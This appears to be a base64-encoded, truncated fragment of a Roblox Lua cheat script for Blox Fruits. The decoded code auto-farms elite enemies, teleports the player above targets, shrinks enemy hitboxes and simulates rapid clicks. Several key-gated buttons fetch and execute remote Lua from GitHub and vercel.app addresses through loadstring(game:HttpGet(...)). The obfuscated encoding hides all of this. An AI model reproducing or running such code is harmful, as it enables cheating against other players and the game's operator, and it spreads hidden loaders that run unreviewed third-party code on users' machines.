GxheWVyOkZpbmRGaXJzdENoaWxkKCJCYWNrcGFjayIpIG9yIG5vdCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBsb2NhbCBiYWNrcGFjayA9IHBsYXllci5CYWNrcGFjawogICAgICAgICAgICBsb2NhbCBodW1hbm9pZCA9IHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIEZpbmQgbWVsZWUgd2VhcG9ucyAoc3dvcmRzLCBibGFkZXMsIGthdGFuYXMsIGV0Yy4pCiAgICAgICAgICAgIGxvY2FsIG1lbGVlS2V5d29yZHMgPSB7InN3b3JkIiwgImJsYWRlIiwgImthdGFuYSIsICJzYWJlciIsICJjdXRsYXNzIiwgInBvbGUiLCAic3BlYXIiLCAidHJpZGVudCJ9CiAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgXywgdG9vbCBpbiBwYWlycyhiYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdG9vbE5hbWUgPSB0b29sLk5hbWU6bG93ZXIoKQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBrZXl3b3JkIGluIHBhaXJzKG1lbGVlS2V5d29yZHMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHN0cmluZy5maW5kKHRvb2xOYW1lLCBrZXl3b3JkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZDpFcXVpcFRvb2wodG9vbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgLS0gSWYgbm8ga2V5d29yZCBtYXRjaCwgZXF1aXAgYW55IHRvb2wKICAgICAgICAgICAgbG9jYWwgYW55VG9vbCA9IGJhY2twYWNrOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpCiAgICAgICAgICAgIGlmIGFueVRvb2wgdGhlbgogICAgICAgICAgICAgICAgaHVtYW5vaWQ6RXF1aXBUb29sKGFueVRvb2wpCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgIGVuZAoKICAgICAgICB3aGlsZSBDb25maWcuSXNSdW5uaW5nIGRvCiAgICAgICAgICAgIGlmIENvbmZpZy5BdXRvRWxpdGVodW50ZXIgdGhlbgogICAgICAgICAgICAgICAgLS0gQXV0byBFbmFibGUgRmFzdCBNMQogICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5GYXN0TTEgdGhlbgogICAgICAgICAgICAgICAgICAgIENvbmZpZy5GYXN0TTEgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgaWYgRmFzdE0xQnRuIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgRmFzdE0xQnRuLlRleHQgPSAiU1RPUCBGQVNUIE0xIgogICAgICAgICAgICAgICAgICAgICAgICBGYXN0TTFCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIFN0YXJ0RmFzdE0xIHRoZW4gU3RhcnRGYXN0TTEoKSBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAtLSBHZXQgcXVlc3QKICAgICAgICAgICAgICAgICAgICBsb2NhbCBxdWVzdEd1aSA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiUGxheWVyR3VpIikgYW5kIHBsYXllci5QbGF5ZXJHdWk6RmluZEZpcnN0Q2hpbGQoIk1haW4iKSBhbmQgcGxheWVyLlBsYXllckd1aS5NYWluOkZpbmRGaXJzdENoaWxkKCJRdWVzdCIpCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHF1ZXN0R3VpIG9yIG5vdCBxdWVzdEd1aS5WaXNpYmxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJlbW90ZXMuQ29tbUZfOkludm9rZVNlcnZlcigiRWxpdGVIdW50ZXIiKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcXVlc3RMYWJlbCA9IHF1ZXN0R3VpOkZpbmRGaXJzdENoaWxkKCJDb250YWluZXIiKSBhbmQgcXVlc3RHdWkuQ29udGFpbmVyOkZpbmRGaXJzdENoaWxkKCJRdWVzdFRpdGxlIikgYW5kIHF1ZXN0R3VpLkNvbnRhaW5lci5RdWVzdFRpdGxlOkZpbmRGaXJzdENoaWxkKCJUaXRsZSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHF1ZXN0TGFiZWwgYW5kIHF1ZXN0TGFiZWwuVGV4dCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzdHJpbmcuZmluZChxdWVzdExhYmVsLlRleHQsICJEaWFibG8iKSBvciBzdHJpbmcuZmluZChxdWVzdExhYmVsLlRleHQsICJEZWFuZHJlIikgb3Igc3RyaW5nLmZpbmQocXVlc3RMYWJlbC5UZXh0LCAiVXJiYW4iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0TmFtZSA9ICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc3RyaW5nLmZpbmQocXVlc3RMYWJlbC5UZXh0LCAiRGlhYmxvIikgdGhlbiB0YXJnZXROYW1lID0gIkRpYWJsbyIgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc3RyaW5nLmZpbmQocXVlc3RMYWJlbC5UZXh0LCAiRGVhbmRyZSIpIHRoZW4gdGFyZ2V0TmFtZSA9ICJEZWFuZHJlIiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzdHJpbmcuZmluZChxdWVzdExhYmVsLlRleHQsICJVcmJhbiIpIHRoZW4gdGFyZ2V0TmFtZSA9ICJVcmJhbiIgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gRW5zdXJlIG1lbGVlIHdlYXBvbiBpcyBlcXVpcHBlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVxdWlwTWVsZWVXZWFwb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFNlYXJjaCBmb3IgZWxpdGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSB3b3Jrc3BhY2UuRW5lbWllczpGaW5kRmlyc3RDaGlsZCh0YXJnZXROYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldDpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gQ2hlY2sgUmVwbGljYXRlZFN0b3JhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3RvcmFnZVRhcmdldCA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpGaW5kRmlyc3RDaGlsZCh0YXJnZXROYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzdG9yYWdlVGFyZ2V0IGFuZCBzdG9yYWdlVGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHdlZW5Ub0VsaXRlKHN0b3JhZ2VUYXJnZXQuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBFbGl0ZSBmb3VuZCwgc3RheSBBQk9WRSBhbmQgYXR0YWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIENvbmZpZy5BdXRvRWxpdGVodW50ZXIgYW5kIHRhcmdldCBhbmQgdGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCB0YXJnZXQuSHVtYW5vaWQuSGVhbHRoID4gMCBhbmQgdGFyZ2V0LlBhcmVudCBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVxdWlwTWVsZWVXZWFwb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldC5QYXJlbnQgPT0gd29ya3NwYWNlLkVuZW1pZXMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBTdGF5IEFCT1ZFIHRoZSBlbGl0ZSBhbmQgYXR0YWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJvb3RQYXJ0IGFuZCB0YXJnZXQuSHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSB0YXJnZXQuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIDI1LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBSZWR1Y2UgaGl0Ym94IGZvciBlYXNpZXIgaGl0dGluZwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXQuSHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXQuSHVtYW5vaWRSb290UGFydC5TaXplID0gVmVjdG9yMy5uZXcoMiwgMiwgMikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldC5IdW1hbm9pZFJvb3RQYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFJhcGlkIGNsaWNrIGF0dGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRNb3VzZUJ1dHRvbkV2ZW50KGNhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCBjYW1lcmEuVmlld3BvcnRTaXplLlkvMiwgMCwgdHJ1ZSwgZ2FtZSwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kTW91c2VCdXR0b25FdmVudChjYW1lcmEuVmlld3BvcnRTaXplLlgvMiwgY2FtZXJhLlZpZXdwb3J0U2l6ZS5ZLzIsIDAsIGZhbHNlLCBnYW1lLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gRWxpdGUgc3Bhd25lZCBlbHNld2hlcmUsIGdvIHRvIGl0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG5ld1RhcmdldCA9IHdvcmtzcGFjZS5FbmVtaWVzOkZpbmRGaXJzdENoaWxkKHRhcmdldE5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5ld1RhcmdldCBhbmQgbmV3VGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gbmV3VGFyZ2V0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUd2VlblRvRWxpdGUodGFyZ2V0Lkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLkZhcm1TY3JpcHRzLCAiU2NyaXB0cyIsIDAuMSkKCiAgICBkbwogICAgICAgIGxvY2FsIEF1dG9GYXJtQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBBdXRvRmFybUJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgIEF1dG9GYXJtQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgICAgIEF1dG9GYXJtQnRuLlRleHQgPSAiT3AgRmFybSBTY3JpcHQiIC4uIChDb25maWcuSXNXaGl0ZWxpc3RlZCBhbmQgIiIgb3IgIiDwn5SSIikKICAgICAgICBBdXRvRmFybUJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICBBdXRvRmFybUJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBBdXRvRmFybUJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgQXV0b0Zhcm1CdG4uTGF5b3V0T3JkZXIgPSAwLjEyCiAgICAgICAgQXV0b0Zhcm1CdG4uUGFyZW50ID0gUGFnZXMuRmFybVNjcmlwdHMKICAgICAgICBsb2NhbCBjMiA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBjMi5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLDQpIGMyLlBhcmVudCA9IEF1dG9GYXJtQnRuCiAgICAgICAgQXV0b0Zhcm1CdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBDb25maWcuSXNXaGl0ZWxpc3RlZCB0aGVuIFNlbmROb3RpZmljYXRpb24oIllvdXIga2V5IGlzIG5vdCB3aGl0ZWxpc3RlZCwgeW91IGNhbm5vdCB1c2UgdGhpcyBvcHRpb24iLCAzKSByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQ1N0dWRpb3MtRGV2L2NzTG9hZGVyLmx1YS9tYWluL0NTTG9hZGVyLmx1YSIpKSgpCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgZG8KICAgICAgICBsb2NhbCBPcEZydWl0QnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBPcEZydWl0QnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgT3BGcnVpdEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgICAgICBPcEZydWl0QnRuLlRleHQgPSAiT3AgRnJ1aXQgTTEiIC4uIChDb25maWcuSXNXaGl0ZWxpc3RlZCBhbmQgIiIgb3IgIiDwn5SSIikKICAgICAgICBPcEZydWl0QnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIE9wRnJ1aXRCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgT3BGcnVpdEJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgT3BGcnVpdEJ0bi5MYXlvdXRPcmRlciA9IDAuMTMKICAgICAgICBPcEZydWl0QnRuLlBhcmVudCA9IFBhZ2VzLkZhcm1TY3JpcHRzCiAgICAgICAgbG9jYWwgYzYgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgYzYuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCw0KSBjNi5QYXJlbnQgPSBPcEZydWl0QnRuCiAgICAgICAgT3BGcnVpdEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Jc1doaXRlbGlzdGVkIHRoZW4gU2VuZE5vdGlmaWNhdGlvbigiWW91ciBrZXkgaXMgbm90IHdoaXRlbGlzdGVkLCB5b3UgY2Fubm90IHVzZSB0aGlzIG9wdGlvbiIsIDMpIHJldHVybiBlbmQKICAgICAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8veGVub3B2cC52ZXJjZWwuYXBwL2FwaS9GYXN0QXR0YWNrX1BWUCIpKSgpCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgZG8KICAgICAgICBsb2NhbCBPcEF1dG9GYXJtQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBPcEF1dG9GYXJtQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgT3BBdXRvRmFybUJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgICAgICBPcEF1dG9GYXJtQnRuLlRleHQgPSAiT3AgQXV0b0Zhcm0iIC4uIChDb25maWcuSXNXaGl0ZWxpc3RlZCBhbmQgIiIgb3IgIiDwn5SSIikKICAgICAgICBPcEF1dG9GYXJtQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIE9wQXV0b0Zhcm1CdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgT3BBdXRvRmFybUJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgT3BBdXRvRmFybUJ0bi5MYXlvdXRPcmRlciA9IDAuMTQKICAgICAgICBPcEF1dG9GYXJtQnRuLlBhcmVudCA9IFBhZ2VzLkZhcm1TY3JpcHRzCiAgICAgICAgbG9jYWwgYzcgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgYzcuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCw0KSBjNy5QYXJlbnQgPSBPcEF1dG9GYXJtQnRuCiAgICAgICAgT3BBdXRvRmFybUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Jc1doaXRlbGlzdGVkIHRoZW4gU2VuZE5vdGlmaWNhdGlvbigiWW91ciBrZXkgaXMgbm90IHdoaXRlbGlzdGVkLCB5b3UgY2Fubm90IHVzZSB0aGlzIG9wdGlvbiIsIDMpIHJldHVybiBlbmQKICAgICAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Eb21hZGljb29mL0RvbWFkaWNvb2YvbWFpbi9Eb21hZGljaHViL05vdHRvR2F5L1N0YXJ0LnJhbnNjcmlwdCIpKSgpCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5GYXJtU2V0dGluZ3MsICJTZXR0aW5ncyIsIDAuNSkKCiAgICBjcmVhdGVDeWNsZShQYWdlcy5GYXJtU2V0dGluZ3MsICJTZWxlY3QgV2VhcG9uIiwgIlNlbGVjdFdlYXBvblR5cGUiLCB7Ik1lbGVlIiwgIlN3b3JkIiwgIkJsb3ggRnJ1aXQifSwgMC41NSkKICAgIAogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkZhcm1TZXR0aW5ncywgIkJyaW5nIE1vYiIsICJCcmluZ01vYiIsIDAuNTYpCiAgICAKICAgIGNyZWF0ZVNsaWRlcihQYWdlcy5GYXJtU2V0dGluZ3MsICJCcmluZyBSYW5nZSIsICJCcmluZ1JhbmdlIiwgMC41NywgNTAsIDUwMCwgNTApCiAgICAKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5GYXJtU2V0dGluZ3MsICJGYXN0IE0xIChBdXRvKSIsICJGYXN0TTFBdXRvIiwgMC41NykKCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBDb25maWcuSXNSdW5uaW5nIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBkZXNpcmVkVHlwZSA9IENvbmZpZy5TZWxlY3RXZWFwb25UeXBlCiAgICAgICAgICAgICAgICBsb2NhbCBmb3VuZFdlYXBvbiA9IG5pbAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBpc01hdGNoKHRvb2wpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuVG9vbFRpcCA9PSBkZXNpcmVkVHlwZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCB0IGluIHBhaXJzKHBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXNNYXRjaCh0KSB0aGVuIGZvdW5kV2VhcG9uID0gdC5OYW1lIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAg" .. "ICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIG5vdCBmb3VuZFdlYXBvbiBhbmQgcGxheWVyLkJhY2twYWNrIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgdCBpbiBwYWlycyhwbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXNNYXRjaCh0KSB0aGVuIGZvdW5kV2VhcG9uID0gdC5OYW1lIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGZvdW5kV2VhcG9uIHRoZW4gQ29uZmlnLlNlbGVjdGVkV2VhcG9uID0gZm91bmRXZWFwb24gZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICBkbwogICAgICAgIGxvY2FsIEZhc3RNMUJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgRmFzdE0xQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgRmFzdE0xQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgICAgIEZhc3RNMUJ0bi5UZXh0ID0gIk9wIEZhc3QgTTEiIC4uIChDb25maWcuSXNXaGl0ZWxpc3RlZCBhbmQgIiIgb3IgIiDwn5SSIikKICAgICAgICBGYXN0TTFCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgRmFzdE0xQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIEZhc3RNMUJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgRmFzdE0xQnRuLkxheW91dE9yZGVyID0gMC42CiAgICAgICAgRmFzdE0xQnRuLlBhcmVudCA9IFBhZ2VzLkZhcm1TZXR0aW5ncwogICAgICAgIGxvY2FsIGMgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgYy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLDQpIGMuUGFyZW50ID0gRmFzdE0xQnRuCiAgICAgICAgCiAgICAgICAgU3RhcnRGYXN0TTEgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKICAgICAgICAgICAgICAgIGxvY2FsIE5ldCA9IFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiTW9kdWxlcyIsIDEwKSBhbmQgUmVwbGljYXRlZFN0b3JhZ2UuTW9kdWxlczpXYWl0Rm9yQ2hpbGQoIk5ldCIsIDEwKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub3QgTmV0IHRoZW4KICAgICAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJOZXQgTW9kdWxlIG5vdCBmb3VuZCAoTm90IEJsb3ggRnJ1aXRzPykiLCAzKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5GYXN0TTEgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIEZhc3RNMUJ0bi5UZXh0ID0gIk9wIEZhc3QgTTEiIC4uIChDb25maWcuSXNXaGl0ZWxpc3RlZCBhbmQgIiIgb3IgIiDwn5SSIikKICAgICAgICAgICAgICAgICAgICBGYXN0TTFCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgUmVnaXN0ZXJIaXQgPSBOZXQ6V2FpdEZvckNoaWxkKCJSRS9SZWdpc3RlckhpdCIsIDUpCiAgICAgICAgICAgICAgICBsb2NhbCBSZWdpc3RlckF0dGFjayA9IE5ldDpXYWl0Rm9yQ2hpbGQoIlJFL1JlZ2lzdGVyQXR0YWNrIiwgNSkKCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBBdHRhY2tNdWx0aXBsZVRhcmdldHModGFyZ2V0cykKICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0YXJnZXRzIG9yICN0YXJnZXRzID09IDAgdGhlbiByZXR1cm4gZW5kCiAgICAgI